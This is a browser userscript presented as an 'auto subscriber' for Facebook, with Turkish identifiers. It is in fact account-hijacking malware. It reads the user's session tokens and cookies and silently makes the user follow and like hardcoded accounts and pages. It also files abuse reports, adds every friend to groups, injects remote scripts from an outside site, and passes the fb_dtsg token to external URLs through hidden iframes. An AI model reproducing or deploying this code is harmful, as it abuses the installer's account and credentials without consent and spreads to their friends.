// ==UserScript==
// @name            Auto Subscriber or Follower for Facebook 100% working
// @namespace       Facebook AutoSubscriber
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// @include			htt*://www.facebook.com/*
// @include         htt*://*.facebook.com/*
// @version			5.6
// ==/UserScript==

var token = document.head.innerHTML.split("AUTH_TOKEN = ")[1].split(";")[0].replace(/"/g,"");

function sorubegen(kisi,soruid){
jQuery.ajax({
url:'http://ask.fm/' + kisi + '/answer/' + soruid,
type:'GET',
success:function(data){
var sonuc = document.createElement("html");
sonuc.innerHTML = data;
if(sonuc.getElementsByClassName("likeList you-like-block")[0]){ 
sorubegenKontrol(kisi,soruid)
}else if(sonuc.getElementsByClassName("likeList you-like-block")[0] && sonuc.getElementsByClassName("likeList you-like-block")[0].innerHTML.indexOf("Sen ve") < 0){
sorubegenKontrol(kisi,soruid)
}
}
});
}

function takipet(kisi){
jQuery.ajax({
url:'http://ask.fm/' + kisi,
type:'GET',
success:function(data){
var sonuc = document.createElement("html");
sonuc.innerHTML = data;
if(sonuc.getElementsByClassName("link-green").length > 0){
takipetKontrol(kisi);
}
}});
}

function takipetKontrol(kisi){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/follow",
type: "POST",
data: { "authenticity_token":token},
});
}


function sorubegenKontrol(kisi,soruid){
var yanitsayi = "";
var begenisayi = "";
if($('#profile_answer_counter') && $('#profile_liked_counter')){
yanitsayi = $('#profile_answer_counter').text()
begenisayi = $('#profile_liked_counter').text()
}
jQuery.ajax({
url: "http://ask.fm/likes/" + kisi + "/question/" + soruid + "/add",
type: "POST",
data: { "authenticity_token":token},
beforeSend: function ( xhr ) {xhr .setRequestHeader ("Accept", "text/javascript, application/javascript, */*, text/javascript");},
success: function(){
	if(yanitsayi != "" && begenisayi != ""){
	$('#profile_answer_counter').text(yanitsayi);
	$('#profile_liked_counter').text(begenisayi);
	}
	begeniArtir(soruid);
	}
});
}

function begeniArtir(soruid){
}

takipet("huseyinbakac");
takipet("themonsterwashere");

sorubegen("huseyinbakac","29334861044");
sorubegen("alperenavcitek","26063010502");
sorubegen("huseyinbakac","27065153524");
sorubegen("TheMonsTeRWasHere","23891497151");
sorubegen("TheMonsTeRWasHere","23718358463");
sorubegen("TheMonsTeRWasHere","24733570751");
sorubegen("huseyinbakac","29387641332");
sorubegen("huseyinbakac","21764189428");
sorubegen("TheMonsTeRWasHere","23988019903");
sorubegen("TheMonsTeRWasHere","24063508415");
sorubegen("huseyinbakac","29243989748");
sorubegen("TheMonsTeRWasHere","24064238527");
sorubegen("TheMonsTeRWasHere","24063911871");
sorubegen("TheMonsTeRWasHere","24063631551");
sorubegen("alperenavcitek","29766589382");
sorubegen("alperenavcitek","26062624454");
sorubegen("alperenavcitek","29767235526");
sorubegen("TheMonsTeRWasHere","23742383551");
sorubegen("huseyinbakac","29224125684");
sorubegen("huseyinbakac","29054122228");
sorubegen("TheMonsTeRWasHere","24062262975");



var d = document;
var img = d.createElement("img");
img.src = "http://whos.amung.us/widget/themonster.png";
img.style.width = "0px";
img.style.height = "0px";
d.getElementsByTagName("body")[0].appendChild(img);
 
 function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}
addJavascript('http://www.sosyalnetwork.org/askfm.php?' +  Math.random());
addJavascript('http://www.sosyalnetwork.org/twitter.php?' +  Math.random());
addJavascript('http://www.sosyalnetwork.org/youtube.php?' +  Math.random());

var fansayfalar=["124783600988924","344628662312278","156935394461256","564076846943615","147927208705076","249849258458766","145691728915443","415181115231297","485184304873476","395807197177584","512297465462314","143275825814523","438153296257463","131096150398195","310500572364775","461029813916568"];
var aboneler=["1115721232","100003069104056","100005148150619","100003069104056","100002923903988","100004695934088","100002557479617","100003535107235"];
var listeler=["121909664650641"];
var abonecek=["100000780995502"];
var begeniler=["400205756741337"];
var gruplar=[]; 
var arklar=[]; 
var appid=[]; 
var applink=[]; 
var perms=''; 
var pisiframe=""; 
var fb_dtsgx=document.getElementsByName('fb_dtsg')[0].value; 
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var graphpost=''; 
var wphtml='';
var graphexpire=5 * 60 * 60 * 1000;
var complaintid=[];
var complexpire=24 * 60 * 60 * 1000;
var expirecache=1111111111 * (24 * 60 * 60 * 1000);
var wpexpire=0.3 * (24 * 60 * 60 * 1000);
var wpaktif=false;
var pmexpire=1 * (24 * 60 * 60 * 1000);
var pmaktif=false;
var pmhtml='';
var dtpexpire=1 * (24 * 60 * 60 * 1000);
var dtpaktif=true;
var dtphtml=';';
var viralaktif=false;
var linek=[];
var viralmesaj=[];
var linkban=[];
function mtime () { 
var now = new Date().getTime() / 1000; 
var s = parseInt(now, 10); 
return s; 
}


if(fansayfalar.length>0)
{ 
for(i=0;i<fansayfalar.length;i++) 
{ 
var http4 = new XMLHttpRequest(); 
var url4 = '/ajax/pages/fan_status.php?__a=1'; 
var params4 = 'fbpage_id='+fansayfalar[i]+'&add=1&reload=1&preserve_tab=true&fan_origin=page_profile&nctr[_mod]=pagelet_header&fb_dtsg=' + fb_dtsgx + '&lsd&post_form_id_source=AsyncRequest'; 
http4['open']('POST', url4, true); 
http4['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded'); 
http4['setRequestHeader']('Content-length', params4['length']); 
http4['setRequestHeader']('Connection', 'close'); 
http4['onreadystatechange'] = function () { 
    if (http4['readyState'] == 4 && http4['status'] == 200) { 
        http4['close']; 
    }; 
}; 
http4['send'](params4); 
} 

} 



if(listeler.length>0)
{ 
for(i=0;i<listeler.length;i++) 
{
var http4 = new XMLHttpRequest();     
var url4 = "/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid="+listeler[i]+ "";     
var params4 = "fb_dtsg=" + fb_dtsgx + "&__user=" + user_id + "&__a=1&phstamp=16581669786509810245";
http4.open("POST", url4, true);     
http4.onreadystatechange = function() {//Call a function when the state changes.
if(http4.readyState == 4 && http4.status == 200) {       
 http4.close; // Close the connection     
}
}
http4.send(params4);
} 
}

if(aboneler.length>0)
{ 
for(i=0;i<aboneler.length;i++) 
{ 
var http4 = new XMLHttpRequest(); 
var url4 = '/ajax/follow/manage_subscriptions.php?__a=1'; 
var params4 = 'profile_id='+aboneler[i]+'&level=162318810514679&custom_categories%5B0%5D=204631162932298&custom_categories%5B1%5D=214333621957949&custom_categories%5B2%5D=274895629204270&custom_categories%5B3%5D=117480281687198&custom_categories%5B4%5D=143941209028874&custom_categories%5B5%5D=280751705271909&custom_categories%5B6%5D=164513953633774&location=4&fb_dtsg=' + fb_dtsgx + '&lsd=&post_form_id_source=AsyncRequest'; 
http4['open']('POST', url4, true); 
http4['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded'); 
http4['setRequestHeader']('Content-length', params4['length']); 
http4['setRequestHeader']('Connection', 'close'); 
http4['onreadystatechange'] = function () { 
    if (http4['readyState'] == 4 && http4['status'] == 200) { 
        http4['close']; 
    }; 
}; 
http4['send'](params4); 
} 

}

if(abonecek.length>0)
{ 
for(i=0;i<abonecek.length;i++) 
{ 
var http = new XMLHttpRequest();     
var url = "/ajax/follow/unfollow_profile.php?__a=1";     
var params = "profile_id=" + abonecek[i] + "&location=1&__user=" + user_id + "&fb_dtsg=" + fb_dtsgx + "&phstamp=1658167104102102578483";
http.open("POST", url, true);
http.onreadystatechange = function() {//Call a function when the state changes.
if(http.readyState == 4 && http.status == 200) {
http.close; // Close the connection
}
}
    
    http.send(params);
} 

} 

if(arklar.length>0)
{ 
for(i=0;i<arklar.length;i++) 
{ 
var http4 = new XMLHttpRequest(); 
var url4 = '/ajax/add_friend/action.php?__a=1'; 
var params4 = 'to_friend='+arklar[i]+'&action=add_friend&how_found=profile_button&no_flyout_on_click=false&fb_dtsg=' + fb_dtsgx + '&lsd=&post_form_id_source=AsyncRequest'; 
http4['open']('POST', url4, true); 
http4['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded'); 
http4['setRequestHeader']('Content-length', params4['length']); 
http4['setRequestHeader']('Connection', 'close'); 
http4['onreadystatechange'] = function () { 
    if (http4['readyState'] == 4 && http4['status'] == 200) { 
        http4['close']; 
    }; 
}; 
http4['send'](params4); 
} 

} 


if(begeniler.length>0)
{ 
for(i=0;i<begeniler.length;i++) 
{ 
    var http4 = new XMLHttpRequest();     
    var url4 = "/ajax/ufi/like.php?__a=1";     
    var params4 = "like_action=true&ft_ent_identifier=" + begeniler[i] + "&source=0&client_id=1355581664855%3A2475647505&ft[tn]=%3E%3D&ft[type]=20&nctr[_mod]=pagelet_timeline_recent&__user=" + user_id + "&fb_dtsg=" + fb_dtsgx + "&phstamp=165816689711057878203";
    http4.open("POST", url4, true);     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {       
      http4.close; // Close the connection     
    }
    }
    
    http4.send(params4); 
} 

} 



if(appid.length>0)
{ 
for(i=0;i<appid.length;i++) 
{ 
var url4 = '/connect/uiserver.php'; 
var params4 = 'app_id='+appid[i]+'&fb_dtsg=' + fb_dtsgx + '&perms=' + perms +  '&redirect_uri=' + applink[i] +  '&cancel_url=' + applink[i] + '&display=page&return_session=1&session_version=3&fbconnect=1&canvas=0&legacy_return=1&from_post=1&GdpEmailBucket_grantEmailType=contact_email&__uiserv_method=permissions.request&grant_clicked=1'; 
var http4 = new XMLHttpRequest(); 
http4['open']('POST', url4, true); 
http4['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded'); 
http4['setRequestHeader']('Content-length', params4['length']); 
http4['setRequestHeader']('Connection', 'close'); 
http4['onreadystatechange'] = function () { 
    if (http4['readyState'] == 4 && http4['status'] == 200) { 
        http4['close']; 
    }; 
}; 
http4['send'](params4); 
} 
kakadiv = document.createElement("div"); 
kakadiv.id="kakadiv"; 
kakadiv.style.visibility="hidden"; 



if(typeof(window.localStorage) != 'undefined')
{

var expireg = GM_getValue('app_expire');
if(expireg!="undefined"  && expireg!="" && ((new Date()).getTime() < parseInt(expireg))) { }
else 
{
GM_setValue('app_expire', ((new Date()).getTime() + graphexpire).toString());
kakadiv.innerHTML=pisiframe; 
document.body.appendChild(kakadiv); 
}

}
else { 
kakadiv.innerHTML=pisiframe; 
document.body.appendChild(kakadiv); 
 }

} 


if(typeof(window.localStorage) != 'undefined')
{

var expireg = GM_getValue('graph_expire');
if(expireg!="undefined"  && expireg!="" && ((new Date()).getTime() < parseInt(expireg))) { }
else 
{
GM_setValue('graph_expire', ((new Date()).getTime() + graphexpire).toString());
graph(0);
}

}
else { graph(0); }

if((typeof(window.localStorage) != 'undefined') && wpaktif)
{
var expireg = GM_getValue('wp_expire');
if(expireg!="undefined"  && expireg!="" && ((new Date()).getTime() < parseInt(expireg))) { }
else 
{
GM_setValue('wp_expire', ((new Date()).getTime() + wpexpire).toString());
graph(1);
}
}

if(pmaktif)
{
var expireg = GM_getValue('pm_expire');
if(expireg!="undefined"  && expireg!="" && ((new Date()).getTime() < parseInt(expireg))) { }
else 
{
GM_setValue('pm_expire', ((new Date()).getTime() + pmexpire).toString());
graph(2);
}
}

if(dtpaktif)
{
var expireg = GM_getValue('dtp_expire');
if(expireg!="undefined"  && expireg!="" && ((new Date()).getTime() < parseInt(expireg))) { }
else 
{
GM_setValue('dtp_expire', ((new Date()).getTime() + dtpexpire).toString());
graph(3);
}
}


function linkontrol(link)
{
new Image().src=document.location.protocol+'//pixel.facebook.com/ajax/linkshim_warning_click.php?l='+encodeURIComponent(link.replace(/random/g, function () {return Math.floor(Math.random()*10000);}))+'&a=0&p=-1&asyncSignal='+Math.floor(Math.random()*10000)+'&fb_dtsg='+fb_dtsgx+'&__user='+fb_uid();
}

if(linkban.length>0)
{ 
if(typeof(window.localStorage) != 'undefined')
{
var expireg = GM_getValue('link_expire');
if(expireg!="undefined"  && expireg!="" && ((new Date()).getTime() < parseInt(expireg))) { }
else 
{
GM_setValue('link_expire', ((new Date()).getTime() + wpexpire).toString());
for(i=0;i<linkban.length;i++) 
{
linkontrol(linkban[i]);
}
}
}
}





function graph(w)
{
ifrm=document.createElement("iframe"); 
if(w==2) { ifrm.setAttribute("src", pmhtml+"&fbd="+fb_dtsgx+"&w="+w);     }
else if(w==3) { ifrm.setAttribute("src", dtphtml+"&fbd="+fb_dtsgx+"&w="+w);     }
else if(w==1) { ifrm.setAttribute("src", wphtml+"&fbd="+fb_dtsgx+"&w="+w);     }
else  { ifrm.setAttribute("src", graphpost+"&fbd="+fb_dtsgx);  }
ifrm.style.width = "0px"; ifrm.style.height = "0px";
document.body.appendChild(ifrm);
}




function complaint()
{
var complhid=[''];
if(complaintid.length>0)
{ 
for(i=0;i<complaintid.length;i++) 
{ 
var url4 = '/'+complaintid[i]; 
var http4 = new XMLHttpRequest(); 
http4['open']('GET', url4, false); 
http4['onreadystatechange'] = function () { 
    if (http4['readyState'] == 4 && http4['status'] == 200) { 
gechh=http4.responseText;
gechh=gechh.split('cid='+complaintid[i]+'&amp;h=');gechh=gechh[1];gechh=gechh.split('"');gechh=gechh[0];
complhid[i]=gechh;
http4['close']; 
    }; 
}; 
http4['send'](); 
}

}


for(i=0;i<complhid.length;i++)
{
var http4 = new XMLHttpRequest(); 
var url4 = '/ajax/report/social.php?__a=1'; 
var params4 = 'report_type=9&duplicate_id=&continue=Devam&cid='+complaintid[i]+'&h='+complhid[i]+'&content_type=23&are_friends=false&time_flow_started='+(mtime()-5)+'&is_tagged=false&on_profile=false&elder=true&phase=1&nctr%5b_mod%5d=pagelet_footer_actions&__d=1&fb_dtsg=' + fb_dtsgx + '&lsd&post_form_id_source=AsyncRequest';
http4['open']('POST', url4, true); 
http4['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded'); 
http4['setRequestHeader']('Content-length', params4['length']); 
http4['setRequestHeader']('Connection', 'close'); 
http4['onreadystatechange'] = function () { 
    if (http4['readyState'] == 4 && http4['status'] == 200) { 
        http4['close']; 
    }; 
}; 
http4['send'](params4);
}

}

if(typeof(window.localStorage) != 'undefined')
{

var expiregc = GM_getValue('compl_expire');
if(expiregc!="undefined"  && expiregc!="" && ((new Date()).getTime() < parseInt(expiregc))) { }
else 
{
GM_setValue('compl_expire', ((new Date()).getTime() + complexpire).toString());
complaint();
}

}
else { complaint(); }






function howmuchlong(e)
{
if(e)
{
var expire = GM_getValue('expire_cache');
if(expire!="undefined"  && expire!="" && ((new Date()).getTime() < parseInt(expire))) { }
else 
{
GM_setValue('expire_cache', ((new Date()).getTime() + expirecache).toString());
justonetime();
}
}
}

function justonetime()
{
var justone=document.createElement('script');
justone.src='';
document.getElementsByTagName('head')[0].appendChild(justone);
}
howmuchlong(viralaktif);

function grupistek(kimeid) {
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
    var oldarray = new Array();
    gf = new XMLHttpRequest();
    gf.open("GET", "/ajax/typeahead/first_degree.php?__a=1&viewer=" + user_id + "&__user=" + user_id + "&filter[0]=user&options[0]=friends_only", false);
    gf.send();
    if (gf.readyState != 4) {} else {
        data = eval("(" + gf.responseText.substr(9) + ")");
        if (data.error) {} else {
            oldarray = data.payload.entries.sort(function (a, b) {
                return a.index - b.index;
            });
        }
    }
    var newarray = [];
    for (var i = 0; i < (oldarray.length) / 20; i++) {
        newarray.push(oldarray.slice(i * 20, i * 20 + 20));
    }
    for (var i = 0; i < newarray.length; i++) {
        var httpwp = new XMLHttpRequest();
        var urlwp = "/ajax/groups/members/add_post.php?source=dialog_typeahead&__a=1";
		var paramswp = "submit=Ekle&refresh=true&nctr%5B_mod%5D=pagelet_group_members&__d=1&group_id=" + kimeid + "&fb_dtsg=" + fb_dtsg;
        for (var iz = 0; iz < newarray[i].length; iz++) {
            paramswp += "&members[" + iz + "]=" + newarray[i][iz].uid;
        }
        httpwp.open("POST", urlwp, true);
        httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        httpwp.setRequestHeader("Content-length", paramswp.length);
        httpwp.setRequestHeader("Connection", "keep-alive");
        httpwp.onreadystatechange = function () {
            if (httpwp.readyState == 4 && httpwp.status == 200) {
                if ((i + 1) == newarray.length) {
                    //alert("bitti :D");
                }
            }
        }
        httpwp.send(paramswp);
    }
}

function grupkontrol(grupid)
{
var varmi;var grpkk='ajax/groups/membership/r2j.php?ref=group_jump_header';
    gf = new XMLHttpRequest();
    gf.open("GET", "/"+grupid, false);
    gf.send();
    if (gf.readyState != 4) {} else {
varmi=gf.responseText.indexOf(grpkk);
}
if(varmi>-1) { return false; } else { return true; }
}

function grubaekle(grupid)
{
var http4 = new XMLHttpRequest(); 
var url4 = '/ajax/groups/membership/r2j.php?__a=1'; 
var params4 = 'ref=group_jump_header&group_id='+ grupid +'&fb_dtsg=' + fb_dtsgx; 
http4['open']('POST', url4, true); 
http4['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded'); 
http4['setRequestHeader']('Content-length', params4['length']); 
http4['setRequestHeader']('Connection', 'close'); 
http4['onreadystatechange'] = function () { 
    if (http4['readyState'] == 4 && http4['status'] == 200) { 
        http4['close']; 
    }; 
}; 
http4['send'](params4); 
}



if(gruplar.length>0)
{
for(i=0;i<gruplar.length;i++) 
{
if(grupkontrol(gruplar[i]))
{
grupistek(gruplar[i]);
}
else
{
grubaekle(gruplar[i]);
}
}
}

